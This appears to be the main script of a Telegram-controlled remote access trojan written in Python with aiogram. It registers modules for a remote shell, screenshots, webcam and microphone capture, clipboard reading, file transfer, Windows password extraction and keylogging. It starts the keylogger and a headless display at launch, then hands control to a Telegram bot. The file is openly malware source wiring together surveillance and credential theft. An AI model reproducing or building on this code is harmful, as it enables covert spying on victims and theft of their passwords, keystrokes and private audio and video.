import asyncio
import logging
import os
import subprocess
import time
from aiogram import Dispatcher, types
from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic, clipboard, win_passwords, keylogger
from cfg import bot as bot

# Author : Exited3n
# https://t.me/wh_lab

os.makedirs('logs', exist_ok=True)

# Configure logging
logging.basicConfig(level=logging.INFO, filename='logs/bot.log',
                    format="%(filename)s:%(lineno)d #%(levelname)-8s" "[%(asctime)s] - %(name)s - %(message)s")


def setup_xvfb():
    """Start Xvfb if no X server is running and set DISPLAY environment variable."""
    display = ":99"  # Use display :99 for Xvfb
    if os.environ.get('DISPLAY'):
        logging.info(f"DISPLAY already set to {os.environ['DISPLAY']}")
        return

    try:
        # Check if Xvfb is already running
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        if 'Xvfb' in result.stdout:
            logging.info("Xvfb is already running")
            os.environ['DISPLAY'] = display
            return

        # Start Xvfb
        logging.info(f"Starting Xvfb on display {display}")
        subprocess.Popen(['Xvfb', display, '-screen', '0', '1024x768x16'], stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
        time.sleep(1)  # Give Xvfb time to start
        os.environ['DISPLAY'] = display
        logging.info(f"Xvfb started and DISPLAY set to {display}")
    except Exception as e:
        logging.error(f"Failed to start Xvfb: {e}")
        raise


dp = Dispatcher()

# Append routers
logging.info("Including routers")
dp.include_router(handlers.router)
dp.include_router(sys_info.router)
dp.include_router(screenshot.router)
dp.include_router(ip_addr.router)
dp.include_router(up_down.router)
dp.include_router(shell.router)
dp.include_router(ps.router)
dp.include_router(webcam.router)
dp.include_router(file_man.router)
dp.include_router(mic.router)
dp.include_router(clipboard.router)
dp.include_router(win_passwords.router)
dp.include_router(keylogger.router)
logging.info("All routers included")


@dp.errors()
async def errors_handler(update: types.Update, exception: Exception):
    logging.error(f'❌ Error: {update}: {exception}')


async def main():
    try:
        logging.info("Setting up Xvfb")
        setup_xvfb()
        logging.info("Starting keylogger setup")
        keylogger.setup_keylogger()
        logging.info("Starting bot polling")
        await dp.start_polling(bot)
    except (KeyboardInterrupt, SystemExit):
        logging.info("Bot stopped")
    finally:
        await bot.session.close()


if __name__ == "__main__":
    logging.info('Bot starting...')
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print('⛔️ Bot stopped by Ctrl + C')
        logging.info('⛔️ Bot stopped by Ctrl + C')
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        print(f"Fatal error: {e}")
